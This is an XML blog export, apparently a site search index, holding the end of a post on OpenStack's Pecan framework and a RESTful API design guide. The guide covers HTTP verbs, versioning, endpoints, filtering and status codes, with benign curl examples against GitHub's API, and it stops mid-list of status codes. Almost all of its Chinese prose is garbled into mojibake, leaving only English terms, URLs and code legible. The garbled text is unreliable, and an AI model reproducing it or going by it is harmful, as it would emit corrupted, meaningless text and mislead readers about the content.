ApplicationÔºâ„ÄÇÂõ†‰∏∫ÁÅµÊ¥ªÊÄßÁöÑÂ•ΩÂ§Ñ‰∏çÊòØÂæàÊòéÊòæÔºåËÄå‰ª£Á†ÅÈáèÂ§ßÁöÑÂùèÂ§ÑÂæàÊòéÊòæÔºåÊØîÂ¶Ç‰∏äÈù¢ÈÇ£‰∏™class ApplicationÈúÄË¶ÅÂú®ÊØè‰∏™È°πÁõÆ‰∏≠Â§çÂà∂‰∏ÄÈÅçÔºåÊâÄ‰ª•Á§æÂå∫ÁöÑÊñ∞È°πÁõÆÂ∞±ÂºÄÂßã‰ΩøÁî®Êñ∞ÁöÑWebÊ°ÜÊû∂Pecan Êñ∞È°πÁõÆÁöÑapiÊúçÂä°PecanÊòØ‰∏Ä‰∏™Âü∫‰∫éÂØπË±°Ë∑ØÁî±ÁöÑÊ°ÜÊû∂ÔºåÂç≥ÁÅµÊ¥ªÂèàÁÆÄÂçï„ÄÇPecan‰∏ªË¶ÅÂÆûÁé∞‰∫ÜURLË∑ØÁî±ÂäüËÉΩÔºåÊîØÊåÅRESTful API„ÄÇPecanÊ≤°ÊúâÂÆûÁé∞Ê®°Êùø„ÄÅsessionÁÆ°ÁêÜÂíåORMÁ≠âÂäüËÉΩÔºå‰ΩÜÊòØËøô‰∫õÂäüËÉΩÂèØ‰ª•ÈÄöËøáÂÖ∂‰ªñÁöÑÊ®°ÂùóÊù•ÂÆûÁé∞„ÄÇÂØπ‰∫éOpenStackÊù•ËØ¥ÔºåPecanÊòØ‰∏Ä‰∏™ÂæàÂ•ΩÁöÑÈÄâÊã©ÔºåÂõ†‰∏∫OpenStackÈ°πÁõÆ‰∏≠Áªü‰∏Ä‰ΩøÁî®sqlalchemyÊù•ÂÆûÁé∞ORMÔºåAPIÁöÑÂÆûÁé∞‰πü‰∏çÈúÄË¶ÅÊ®°ÊùøÂäüËÉΩÔºåÂÆâÂÖ®ÊéßÂà∂ÂàôÂü∫‰∫éKeystone‰ΩìÁ≥ª„ÄÇ‰ΩøÁî®PecanÊù•ÂºÄÂèëRESTÊúçÂä°Ôºå‰ª£Á†ÅÈáèÂæàÂ∞ëÔºå‰ª£Á†ÅÁªìÊûÑ‰πüÊ∏ÖÊô∞„ÄÇCeilometerÈ°πÁõÆÂ∞±ÊòØ‰ΩøÁî®‰∫ÜPecan]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RESTful API ËÆæËÆ°ËßÑËåÉ]]></title>
    <url>%2F2017%2F01%2F06%2Frest-api-design%2F</url>
    <content type="text"><![CDATA[ÂÅöÂá∫‰∏Ä‰∏™Â•ΩÁöÑAPIËÆæËÆ°ÂæàÈöæ„ÄÇAPIË°®ËææÁöÑÊòØ‰Ω†ÁöÑÊï∞ÊçÆÂíå‰Ω†ÁöÑÊï∞ÊçÆ‰ΩøÁî®ËÄÖ‰πãÈó¥ÁöÑÂ•ëÁ∫¶ÔºåÂõ†Ê≠§APIÁöÑËÆæËÆ°ÂæÄÂæÄÊòØÁ´ôÂú®‰ΩøÁî®ËÄÖÁöÑËßíÂ∫¶ËøõË°åÁöÑÔºåËÄåÂÖ≥‰∫éRESTfulÁöÑ‰ªãÁªçÂèØ‰ª•ÂèÇËÄÉÈòÆ‰∏ÄÂ≥∞ÁöÑÂçöÂÆ¢ÁêÜËß£RESTfulÊû∂ÊûÑ , ËøôÈáåÂêåÊó∂‰πüÂèÇËÄÉ‰∫Ü‰ªñÁöÑÂè¶‰∏ÄÁØáÂçöÂÆ¢RESTful API ËÆæËÆ°ÊåáÂçóÂú®ËøôÊñπÈù¢Êúâ‰∏ÄÁØáÂæàÂá∫ÂêçÁöÑÊñáÁ´†ÔºåËøôÈáåÈúÄË¶Å‰Ω†Ëá™Â∑±Ëß£ÂÜ≥ÁøªÂ¢ôÈóÆÈ¢òPrinciples of good RESTful API Design ÂÆö‰πâ ËøôÈáåÊúâ‰∏Ä‰∫õÈùûÂ∏∏ÈáçË¶ÅÁöÑÊúØËØ≠ÔºåÊàëÂ∞ÜÂú®Êú¨ÊñáÈáåÈù¢‰∏ÄÁõ¥Áî®Âà∞ÂÆÉ‰ª¨ ËµÑÊ∫ê(Resource)Ôºö‰∏Ä‰∏™ÂØπË±°ÁöÑÂçïÁã¨ÂÆû‰æãÔºåÂ¶Ç‰∏ÄÂè™Âä®Áâ© ÈõÜÂêà(Collection)Ôºö‰∏ÄÁæ§ÂêåÁßçÂØπË±°ÔºåÂ¶ÇÂä®Áâ© HTTPÔºöË∑®ÁΩëÁªúÁöÑÈÄö‰ø°ÂçèËÆÆ ÂÆ¢Êà∑Á´Ø(Consumer)ÔºöÂèØ‰ª•ÂàõÂª∫HTTPËØ∑Ê±ÇÁöÑÂÆ¢Êà∑Á´ØÂ∫îÁî®Á®ãÂ∫è Á¨¨‰∏âÊñπÂºÄÂèëËÄÖ(Third Party Developer)ÔºöËøô‰∏™ÂºÄÂèëËÄÖ‰∏çÂ±û‰∫é‰Ω†ÁöÑÈ°πÁõÆ‰ΩÜÊòØÊúâÊÉ≥‰ΩøÁî®‰Ω†ÁöÑÊï∞ÊçÆ ÊúçÂä°Âô®(Server)Ôºö‰∏Ä‰∏™HTTPÊúçÂä°Âô®ÊàñËÄÖÂ∫îÁî®Á®ãÂ∫èÔºåÂÆ¢Êà∑Á´ØÂèØ‰ª•Ë∑®ÁΩëÁªúËÆøÈóÆÂÆÉ Á´ØÁÇπ(Endpoint)ÔºöËøô‰∏™APIÂú®ÊúçÂä°Âô®‰∏äÁöÑURLÁî®‰∫éË°®Ëææ‰∏Ä‰∏™ËµÑÊ∫êÊàñËÄÖ‰∏Ä‰∏™ÈõÜÂêà ÂπÇÁ≠â(Idempotent)ÔºöÊó†ËæπÈôÖÊïàÂ∫îÔºåÂ§öÊ¨°Êìç‰ΩúÂæóÂà∞Áõ∏ÂêåÁöÑÁªìÊûú URLÊÆµ(Segment)ÔºöÂú®URLÈáåÈù¢Â∑≤ÊñúÊù†ÂàÜÈöîÁöÑÂÜÖÂÆπ Êï∞ÊçÆËÆæËÆ°‰∏éÊäΩË±° ÁêÜÊ∏Ö‰∏öÂä°Êï∞ÊçÆÊµÅÁ®ã ËßÑÂàíÂ•Ω‰Ω†ÁöÑAPIÁöÑÂ§ñËßÇË¶ÅÂÖà‰∫éÂºÄÂèëÂÆÉÂÆûÈôÖÁöÑÂäüËÉΩ„ÄÇÈ¶ñÂÖà‰Ω†Ë¶ÅÁü•ÈÅìÊï∞ÊçÆËØ•Â¶Ç‰ΩïËÆæËÆ°ÂíåÊ†∏ÂøÉÊúçÂä°/Â∫îÁî®Á®ãÂ∫è‰ºöÂ¶Ç‰ΩïÂ∑•‰Ωú, ËøôÈÉ®ÂàÜÁöÑÂ∑•‰Ωú ÂæÄÂæÄÂ∞±ÊòØÈúÄË¶ÅÂÜôÂ•Ω PRDÂíåDRDËøô‰∫õÂäüËÉΩÊñáÊ°£ Á´ôÂú®‰ΩøÁî®ËÄÖÁöÑËßíÂ∫¶ËøõË°åÂêàÁêÜÊäΩË±° ÊúâÊó∂ÂÄô‰∏Ä‰∏™ÈõÜÂêàÂèØ‰ª•Ë°®Ëææ‰∏Ä‰∏™Êï∞ÊçÆÂ∫ìË°®ÔºåËÄå‰∏Ä‰∏™ËµÑÊ∫êÂèØ‰ª•Ë°®ËææÊàêÈáåÈù¢ÁöÑ‰∏ÄË°åËÆ∞ÂΩïÔºå‰ΩÜÊòØËøôÂπ∂‰∏çÊòØÂ∏∏ÊÄÅ„ÄÇ‰∫ãÂÆû‰∏äÔºå‰Ω†ÁöÑAPIÂ∫îËØ•Â∞ΩÂèØËÉΩ ÈÄöËøáÊäΩË±°Êù•ÂàÜÁ¶ªÊï∞ÊçÆ‰∏é‰∏öÂä°ÈÄªËæë„ÄÇËøôÁÇπÈùûÂ∏∏ÈáçË¶ÅÔºåÂè™ÊúâËøôÊ†∑ÂÅö‰Ω†Êâç‰∏ç‰ºöÊâìÂáªÂà∞ÈÇ£‰∫õÊã•ÊúâÂ§çÊùÇ‰∏öÂä°ÁöÑÁ¨¨‰∏âÊñπÂºÄÂèëËÄÖÔºå Âê¶Âàô‰ªñ‰ª¨ÊòØ‰∏ç‰ºö‰ΩøÁî®‰Ω†ÁöÑAPIÁöÑ„ÄÇ Â¶Ç‰ΩïÂºÄÊîæAPI ÂΩìÁÑ∂‰Ω†ÁöÑÊúçÂä°ÂèØËÉΩÂæàÂ§öÈÉ®ÂàÜÊòØ‰∏çÂ∫îËØ•ÈÄöËøáAPIÊö¥Èú≤Âá∫ÂéªÁöÑ„ÄÇÊØîËæÉÂ∏∏ËßÅÁöÑ‰æãÂ≠êÂ∞±ÊòØÂæàÂ§öAPIÊòØ‰∏çÂÖÅËÆ∏Á¨¨‰∏âÊñπÊù•ÂàõÂª∫Áî®Êà∑ÁöÑ„ÄÇ HTTP Âä®ËØç‰∏Ä‰∏™Â•ΩÁöÑRESTful APIÂè™ÂÖÅËÆ∏Á¨¨‰∏âÊñπË∞ÉÁî®ËÄÖ‰ΩøÁî®ËøôÂõõ‰∏™ÂçäHTTPÂä®ËØçËøõË°åÊï∞ÊçÆ‰∫§‰∫íÔºåÂπ∂‰∏îÂú®URLÊÆµÈáåÈù¢‰∏çÂá∫Áé∞‰ªª‰ΩïÂÖ∂‰ªñÁöÑÂä®ËØç„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåGETËØ∑Ê±ÇÂèØ‰ª•Ë¢´ÊµèËßàÂô®ÁºìÂ≠òÔºàÈÄöÂ∏∏‰πüÊòØËøôÊ†∑ÁöÑÔºâ„ÄÇ‰æãÂ¶ÇÔºåÁºìÂ≠òËØ∑Ê±ÇÂ§¥Áî®‰∫éÁ¨¨‰∫åÊ¨°Áî®Êà∑ÁöÑPOSTËØ∑Ê±Ç„ÄÇHEADËØ∑Ê±ÇÊòØÂü∫‰∫é‰∏Ä‰∏™Êó†ÂìçÂ∫î‰ΩìÁöÑGETËØ∑Ê±ÇÔºåÂπ∂‰∏î‰πüÂèØ‰ª•Ë¢´ÁºìÂ≠òÁöÑ„ÄÇ GET (ÈÄâÊã©)Ôºö‰ªéÊúçÂä°Âô®‰∏äËé∑Âèñ‰∏Ä‰∏™ÂÖ∑‰ΩìÁöÑËµÑÊ∫êÊàñËÄÖ‰∏Ä‰∏™ËµÑÊ∫êÂàóË°®„ÄÇ POST ÔºàÂàõÂª∫ÔºâÔºö Âú®ÊúçÂä°Âô®‰∏äÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑËµÑÊ∫ê„ÄÇ PUT ÔºàÊõ¥Êñ∞ÔºâÔºö‰ª•Êï¥‰ΩìÁöÑÊñπÂºèÊõ¥Êñ∞ÊúçÂä°Âô®‰∏äÁöÑ‰∏Ä‰∏™ËµÑÊ∫ê„ÄÇ PATCH ÔºàÊõ¥Êñ∞ÔºâÔºöÂè™Êõ¥Êñ∞ÊúçÂä°Âô®‰∏ä‰∏Ä‰∏™ËµÑÊ∫êÁöÑ‰∏Ä‰∏™Â±ûÊÄß„ÄÇ DELETE ÔºàÂà†Èô§ÔºâÔºöÂà†Èô§ÊúçÂä°Âô®‰∏äÁöÑ‰∏Ä‰∏™ËµÑÊ∫ê„ÄÇ HEAD Ôºö Ëé∑Âèñ‰∏Ä‰∏™ËµÑÊ∫êÁöÑÂÖÉÊï∞ÊçÆÔºåÂ¶ÇÊï∞ÊçÆÁöÑÂìàÂ∏åÂÄºÊàñÊúÄÂêéÁöÑÊõ¥Êñ∞Êó∂Èó¥„ÄÇ OPTIONSÔºöËé∑ÂèñÂÆ¢Êà∑Á´ØËÉΩÂØπËµÑÊ∫êÂÅö‰ªÄ‰πàÊìç‰ΩúÁöÑ‰ø°ÊÅØ„ÄÇ ÂüüÂêç ÂüüÂêçÊòØÁî®‰∫éËÆøÈóÆ‰Ω†ÁöÑAPIÊúçÂä°ÁöÑÁ¨¨‰∏ÄÊ≠•ÔºåÂõ†Ê≠§Â¶Ç‰ΩïÂú®ÂüüÂêç‰∏äË°®Áé∞Ëá™Â∑±Êèê‰æõÁöÑAPI ÊúçÂä°ÂñÉÔºå‰ª•‰∏ãÊúâ2ÁßçÊñπÊ≥ï Â∫îËØ•Â∞ΩÈáèÂ∞ÜAPIÈÉ®ÁΩ≤Âú®‰∏ìÁî®ÂüüÂêç‰πã‰∏ã„ÄÇ Â¶ÇÊûúÁ°ÆÂÆöAPIÂæàÁÆÄÂçïÔºå‰∏ç‰ºöÊúâËøõ‰∏ÄÊ≠•Êâ©Â±ïÔºåÂèØ‰ª•ËÄÉËôëÊîæÂú®‰∏ªÂüüÂêç‰∏ã„ÄÇ 12https://api.example.com # ‰∏ì‰∏öÂüüÂêçhttps://example.org/api/ # URI‰∏≠ÊòéÁ°ÆËØ¥Êòé ÁâàÊú¨Âåñ APIÊòØÊúçÂä°Âô®‰∏éÂÆ¢Êà∑Á´Ø‰πãÈó¥ÁöÑ‰∏Ä‰∏™ÂÖ¨ÂÖ±Â•ëÁ∫¶„ÄÇÂ¶ÇÊûú‰Ω†ÂØπÊúçÂä°Âô®‰∏äÁöÑAPIÂÅö‰∫Ü‰∏Ä‰∏™Êõ¥ÊîπÔºåÂπ∂‰∏îËøô‰∫õÊõ¥ÊîπÊó†Ê≥ïÂêëÂêéÂÖºÂÆπÔºå ÈÇ£‰πà‰Ω†Â∞±ÊâìÁ†¥‰∫ÜËøô‰∏™Â•ëÁ∫¶ÔºåÂÆ¢Êà∑Á´ØÂèà‰ºöË¶ÅÊ±Ç‰Ω†ÈáçÊñ∞ÊîØÊåÅÂÆÉ„ÄÇ‰∏∫‰∫ÜÈÅøÂÖçËøôÊ†∑ÁöÑ‰∫ãÊÉÖÔºå‰Ω†Êó¢Ë¶ÅÁ°Æ‰øùÂ∫îÁî®Á®ãÂ∫èÈÄêÊ≠•ÁöÑÊºîÂèòÔºå ÂèàË¶ÅËÆ©ÂÆ¢Êà∑Á´ØÊª°ÊÑè„ÄÇÈÇ£‰πà‰Ω†ÂøÖÈ°ªÂú®ÂºïÂÖ•Êñ∞ÁâàÊú¨APIÁöÑÂêåÊó∂‰øùÊåÅÊóßÁâàÊú¨API‰ªçÁÑ∂ÂèØÁî®„ÄÇ ÈöèÁùÄÊó∂Èó¥ÁöÑÊé®ÁßªÔºå‰Ω†ÂèØËÉΩÂ£∞Êòé‰∏çÂÜçÊîØÊåÅÊüê‰∫õÊóßÁâàÊú¨ÁöÑAPI„ÄÇÁî≥Êòé‰∏çÊîØÊåÅ‰∏Ä‰∏™ÁâπÊÄßÂπ∂‰∏çÊÑèÂë≥ÁùÄÂÖ≥Èó≠ÊàñËÄÖÁ†¥ÂùèÂÆÉ„ÄÇ ËÄåÊòØÂëäËØâÂÆ¢Êà∑Á´ØÊóßÁâàÊú¨ÁöÑAPIÂ∞ÜÂú®Êüê‰∏™ÁâπÂÆöÁöÑÊó∂Èó¥Ë¢´Âà†Èô§ÔºåÂπ∂‰∏îÂª∫ËÆÆ‰ªñ‰ª¨‰ΩøÁî®Êñ∞ÁâàÊú¨ÁöÑAPI„ÄÇ Â¶ÇÊûú‰Ω†Âè™ÊòØÁÆÄÂçïÁöÑÂ¢ûÂä†‰∏Ä‰∏™Êñ∞ÁöÑÁâπÊÄßÂà∞API‰∏äÔºåÂ¶ÇËµÑÊ∫ê‰∏äÁöÑ‰∏Ä‰∏™Êñ∞Â±ûÊÄßÊàñËÄÖÂ¢ûÂä†‰∏Ä‰∏™Êñ∞ÁöÑÁ´ØÁÇπÔºå‰Ω†‰∏çÈúÄË¶ÅÂ¢ûÂä†APIÁöÑÁâàÊú¨„ÄÇ Âõ†‰∏∫Ëøô‰∫õÂπ∂‰∏ç‰ºöÈÄ†ÊàêÂêëÂêéÂÖºÂÆπÊÄßÁöÑÈóÆÈ¢òÔºå‰Ω†Âè™ÈúÄË¶Å‰øÆÊîπÊñáÊ°£Âç≥ÂèØ„ÄÇ ËøôÈáåÂÆûÁé∞ÊñπÂºèÊúâ2ÁßçÔºö Â∫îËØ•Â∞ÜAPIÁöÑÁâàÊú¨Âè∑ÊîæÂÖ•URL Â∞ÜÁâàÊú¨Âè∑ÊîæÂú®HTTPÂ§¥‰ø°ÊÅØ‰∏≠Ôºå‰ΩÜ‰∏çÂ¶ÇÊîæÂÖ•URLÊñπ‰æøÂíåÁõ¥ËßÇ, GithubÈááÁî®ÁöÑÂ∞±ÊòØËøôÁßçÂÅöÊ≥ï 1234567891011121314151617181920https://api.example.com/v1/ # Âú®URL‰∏≠ËØ¥Êòécurl -i https://api.github.com/users/octocat/orgs # HTTPÂ§¥‰∏≠Ë°®Á§∫APIÁâàÊú¨ HTTP/1.1 200 OK Server: nginx Date: Fri, 12 Oct 2012 23:33:14 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Status: 200 OK ETag: &quot;a00049ba79152d03380c34652f2cb612&quot; X-GitHub-Media-Type: github.v3 X-RateLimit-Limit: 5000 X-RateLimit-Remaining: 4987 X-RateLimit-Reset: 1350085394 Content-Length: 5 Cache-Control: max-age=0, private, must-revalidate X-Content-Type-Options: nosniff API ROOT URI APIÁöÑÊ†πÂú∞ÂùÄÂæàÈáçË¶Å„ÄÇÂèØ‰ª•ÈÄöËøáËøô‰∏™ÂàóË°®Âø´ÈÄü‰∫ÜËß£‰Ω†Êèê‰æõÁöÑÊúçÂä°ÔºåÂõ†Ê≠§ÔºåËÆ©‰Ω†ÁöÑAPIÊ†πÂÖ•Âè£ÁÇπ‰øùÊåÅÂ∞ΩÂèØËÉΩÁöÑÁÆÄÂçï„ÄÇ‰ª•githubÁöÑÂàó 123456789101112131415161718192021222324252627282930313233maojun@maojun-mbp# curl https://api.github.com&#123; &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;, &quot;current_user_authorizations_html_url&quot;: &quot;https://github.com/settings/connections/applications&#123;/client_id&#125;&quot;, &quot;authorizations_url&quot;: &quot;https://api.github.com/authorizations&quot;, &quot;code_search_url&quot;: &quot;https://api.github.com/search/code?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;emails_url&quot;: &quot;https://api.github.com/user/emails&quot;, &quot;emojis_url&quot;: &quot;https://api.github.com/emojis&quot;, &quot;events_url&quot;: &quot;https://api.github.com/events&quot;, &quot;feeds_url&quot;: &quot;https://api.github.com/feeds&quot;, &quot;followers_url&quot;: &quot;https://api.github.com/user/followers&quot;, &quot;following_url&quot;: &quot;https://api.github.com/user/following&#123;/target&#125;&quot;, &quot;gists_url&quot;: &quot;https://api.github.com/gists&#123;/gist_id&#125;&quot;, &quot;hub_url&quot;: &quot;https://api.github.com/hub&quot;, &quot;issue_search_url&quot;: &quot;https://api.github.com/search/issues?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;issues_url&quot;: &quot;https://api.github.com/issues&quot;, &quot;keys_url&quot;: &quot;https://api.github.com/user/keys&quot;, &quot;notifications_url&quot;: &quot;https://api.github.com/notifications&quot;, &quot;organization_repositories_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;organization_url&quot;: &quot;https://api.github.com/orgs/&#123;org&#125;&quot;, &quot;public_gists_url&quot;: &quot;https://api.github.com/gists/public&quot;, &quot;rate_limit_url&quot;: &quot;https://api.github.com/rate_limit&quot;, &quot;repository_url&quot;: &quot;https://api.github.com/repos/&#123;owner&#125;/&#123;repo&#125;&quot;, &quot;repository_search_url&quot;: &quot;https://api.github.com/search/repositories?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;, &quot;current_user_repositories_url&quot;: &quot;https://api.github.com/user/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;starred_url&quot;: &quot;https://api.github.com/user/starred&#123;/owner&#125;&#123;/repo&#125;&quot;, &quot;starred_gists_url&quot;: &quot;https://api.github.com/gists/starred&quot;, &quot;team_url&quot;: &quot;https://api.github.com/teams&quot;, &quot;user_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;&quot;, &quot;user_organizations_url&quot;: &quot;https://api.github.com/user/orgs&quot;, &quot;user_repositories_url&quot;: &quot;https://api.github.com/users/&#123;user&#125;/repos&#123;?type,page,per_page,sort&#125;&quot;, &quot;user_search_url&quot;: &quot;https://api.github.com/search/users?q=&#123;query&#125;&#123;&amp;page,per_page,sort,order&#125;&quot;&#125; Endpoints ‰∏Ä‰∏™Á´ØÁÇπÂ∞±ÊòØÊåáÂêëÁâπÂÆöËµÑÊ∫êÊàñËµÑÊ∫êÈõÜÂêàÁöÑURL„ÄÇÈíàÂØπÊØè‰∏Ä‰∏™Á´ØÁÇπÊù•ËØ¥Ôºå‰Ω†ÂèØËÉΩÊÉ≥ÂàóÂá∫ÊâÄÊúâÂèØË°åÁöÑHTTPÂä®ËØçÂíåÁ´ØÁÇπÁöÑÁªÑÂêà„ÄÇ Âú®RESTfulÊû∂ÊûÑ‰∏≠ÔºåÊØè‰∏™ÁΩëÂùÄ‰ª£Ë°®‰∏ÄÁßçËµÑÊ∫êÔºàresourceÔºâÔºåÊâÄ‰ª•ÁΩëÂùÄ‰∏≠‰∏çËÉΩÊúâÂä®ËØçÔºåÂè™ËÉΩÊúâÂêçËØçÔºå ËÄå‰∏îÊâÄÁî®ÁöÑÂêçËØçÂæÄÂæÄ‰∏éÊï∞ÊçÆÂ∫ìÁöÑË°®Ê†ºÂêçÂØπÂ∫î„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑË°®ÈÉΩÊòØÂêåÁßçËÆ∞ÂΩïÁöÑ ‚ÄúÈõÜÂêà‚ÄùÔºàcollectionÔºâÔºåÊâÄ‰ª•API‰∏≠ÁöÑÂêçËØç‰πüÂ∫îËØ•‰ΩøÁî®Â§çÊï∞„ÄÇ ËØ∑Ê≥®ÊÑèÂ¶Ç‰ΩïÂ±ïÁ§∫Êï∞ÊçÆ‰πãÈó¥ÁöÑÂÖ≥Á≥ªÔºåÁâπÂà´ÊòØÈõáÂëò‰∏éÂä®Áâ©Âõ≠‰πãÈó¥ÁöÑÂ§öÂØπÂ§öÂÖ≥Á≥ª„ÄÇÈÄöËøáÊ∑ªÂä†‰∏Ä‰∏™È¢ùÂ§ñÁöÑURLÊÆµÂ∞±ÂèØ‰ª•ÂÆûÁé∞Êõ¥Â§öÁöÑ‰∫§‰∫íËÉΩÂäõ„ÄÇ ÂΩìÁÑ∂Ê≤°Êúâ‰∏Ä‰∏™HTTPÂä®ËØçËÉΩË°®Á§∫Ê≠£Âú®Ëß£Èõá‰∏Ä‰∏™‰∫∫Ôºå‰ΩÜÊòØ‰Ω†ÂèØ‰ª•‰ΩøÁî®DELETE‰∏Ä‰∏™Âä®Áâ©Âõ≠ÈáåÁöÑÈõáÂëòÊù•ËææÂà∞Áõ∏ÂêåÁöÑÊïàÊûú„ÄÇ 1234567891011121314151617https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/animal_typeshttps://api.example.com/v1/employeesGET /zoos: List all Zoos (ID and Name, not too much detail)POST /zoos: Create a new ZooGET /zoos/ZID: Retrieve an entire Zoo objectPUT /zoos/ZID: Update a Zoo (entire object)PATCH /zoos/ZID: Update a Zoo (partial object)DELETE /zoos/ZID: Delete a ZooGET /zoos/ZID/animals: Retrieve a listing of Animals (ID and Name).GET /animals: List all Animals (ID and Name).POST /animals: Create a new AnimalGET /animals/AID: Retrieve an Animal objectPUT /animals/AID: Update an Animal (entire object)PATCH /animals/AID: Update an Animal (partial object) ËøáÊª§ÂíåÊéíÂ∫è ‰ΩøÁî®ËøáÊª§ÂíåÊéíÂ∫èÊúâÂ§öÁßçÂéüÂõ†ÔºåÂõ†Ê≠§APIÂ∫îËØ•Êèê‰æõÂèÇÊï∞ÔºåËøáÊª§ÂíåÊéíÂ∫èËøîÂõûÁªìÊûúÔºåÈôç‰ΩéÂÆ¢Êà∑Á´ØÁöÑÂ§çÊùÇÂ∫¶„ÄÇ Â¶ÇÊûúËÆ∞ÂΩïÊï∞ÈáèÂæàÂ§öÔºåÊúçÂä°Âô®‰∏çÂèØËÉΩÈÉΩÂ∞ÜÂÆÉ‰ª¨ËøîÂõûÁªôÁî®Êà∑„ÄÇ ‰ªéÂÆ¢Êà∑Á´ØÁöÑËßíÂ∫¶Êù•ËØ¥ÔºåÊúÄÂ∞èÂåñÁΩëÁªú‰º†ËæìÔºåÂπ∂ËÆ©ÂÆ¢Êà∑Á´ØÂ∞ΩÂèØËÉΩÂø´ÁöÑÂæóÂà∞Êü•ËØ¢ÁªìÊûú„ÄÇ ‰ªéÊúçÂä°Âô®ËßíÂ∫¶Êù•ËØ¥ÔºåÂìçÂ∫îËØ∑Ê±ÇË∂äÂ∞èË¥üËΩΩÂ∞±Ë∂äÂ∞è„ÄÇ 1234?limit=10: ÂáèÂ∞ëËøîÂõûÁªôÂÆ¢Êà∑Á´ØÁöÑÁªìÊûúÊï∞ÈáèÔºàÁî®‰∫éÂàÜÈ°µÔºâ?offset=10: ÂèëÈÄÅ‰∏ÄÂ†Ü‰ø°ÊÅØÁªôÂÆ¢Êà∑Á´ØÔºàÁî®‰∫éÂàÜÈ°µÔºâ?animal_type_id=1: ‰ΩøÁî®Êù°‰ª∂ÂåπÈÖçÊù•ËøáÊª§ËÆ∞ÂΩï?sortby=name&amp;order=asc: ÂØπÁªìÊûúÊåâÁâπÂÆöÂ±ûÊÄßËøõË°åÊéíÂ∫è Áä∂ÊÄÅÁ†Å ÊúçÂä°Âô®ÂêëÁî®Êà∑ËøîÂõûÁöÑÁä∂ÊÄÅÁ†ÅÂíåÊèêÁ§∫‰ø°ÊÅØÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ÊòØHTTPÁöÑÊ†áÂáÜÔºåÊâÄ‰ª•ÈÄöÁî®ÊÄß‰∏äÊúâ‰øùËØÅÔºå Áä∂ÊÄÅÁ†ÅÁöÑÂÆåÊï¥ÂÆö‰πâËØ∑ÁúãHTTP1.1/rfc Status Code define 1234567891011121314151617181920Áä∂ÊÄÅÁ†ÅËåÉÂõ¥ËØ¥ÊòéÔºö1xxÔºö‰øùÁïôÁªôÂ∫ïÂ±ÇHTTPÂäüËÉΩ‰ΩøÁî®ÁöÑÔºåÂπ∂‰∏î‰º∞ËÆ°Âú®‰Ω†ÁöÑËÅå‰∏öÁîüÊ∂ØÈáåÈù¢‰πüÁî®‰∏çÁùÄÊâãÂä®ÂèëÈÄÅËøôÊ†∑‰∏Ä‰∏™Áä∂ÊÄÅÁ†ÅÂá∫Êù•„ÄÇ2xxÔºö‰øùÁïôÁªôÊàêÂäüÊ∂àÊÅØ‰ΩøÁî®ÁöÑÔºå‰Ω†Â∞ΩÂèØËÉΩÁöÑÁ°Æ‰øùÊúçÂä°Âô®ÊÄªÂèëÈÄÅËøô‰∫õÁä∂ÊÄÅÁ†ÅÁªôÁî®Êà∑„ÄÇ3xxÔºö‰øùÁïôÁªôÈáçÂÆöÂêëÁî®ÁöÑ„ÄÇÂ§ßÂ§öÊï∞ÁöÑAPI‰∏ç‰ºöÂ§™Â∏∏‰ΩøÁî®ËøôÁ±ªÁä∂ÊÄÅÁ†ÅÔºå‰ΩÜÊòØÂú®Êñ∞ÁöÑË∂ÖÂ™í‰ΩìÊ†∑ÂºèÁöÑAPI‰∏≠‰ºö‰ΩøÁî®Êõ¥Â§ö‰∏Ä‰∫õ„ÄÇ4xxÔºö‰øùÁïôÁªôÂÆ¢Êà∑Á´ØÈîôËØØÁî®ÁöÑ„ÄÇ‰æãÂ¶ÇÔºåÂÆ¢Êà∑Á´ØÊèê‰æõ‰∫Ü‰∏Ä‰∫õÈîôËØØÁöÑÊï∞ÊçÆÊàñËØ∑Ê±Ç‰∫Ü‰∏çÂ≠òÂú®ÁöÑÂÜÖÂÆπ„ÄÇËøô‰∫õËØ∑Ê±ÇÂ∫îËØ•ÊòØÂπÇÁ≠âÁöÑÔºå‰∏ç‰ºöÊîπÂèò‰ªª‰ΩïÊúçÂä°Âô®ÁöÑÁä∂ÊÄÅ„ÄÇ5xxÔºö‰øùÁïôÁªôÊúçÂä°Âô®Á´ØÈîôËØØÁî®ÁöÑ„ÄÇËøô‰∫õÈîôËØØÂ∏∏Â∏∏ÊòØ‰ªéÂ∫ïÂ±ÇÁöÑÂáΩÊï∞ÊäõÂá∫Êù•ÁöÑÔºåÂπ∂‰∏îÂºÄÂèë‰∫∫Âëò‰πüÈÄöÂ∏∏Ê≤°Ê≥ïÂ§ÑÁêÜ„ÄÇÂèëÈÄÅËøôÁ±ªÁä∂ÊÄÅÁ†ÅÁöÑÁõÆÁöÑÊòØÁ°Æ‰øùÂÆ¢Êà∑Á´ØËÉΩÂæóÂà∞‰∏Ä‰∫õÂìçÂ∫î„ÄÇÊî∂Âà∞5xxÂìçÂ∫îÂêéÔºåÂÆ¢Êà∑Á´ØÊ≤°ÂäûÊ≥ïÁü•ÈÅìÊúçÂä°Âô®Á´ØÁöÑÁä∂ÊÄÅÔºåÊâÄ‰ª•ËøôÁ±ªÁä∂ÊÄÅÁ†ÅÊòØË¶ÅÂ∞ΩÂèØËÉΩÁöÑÈÅøÂÖç„ÄÇÂ∏∏ËßÅÁöÑ‰∏Ä‰∫õÁä∂ÊÄÅÁ†ÅÔºö200 OK - 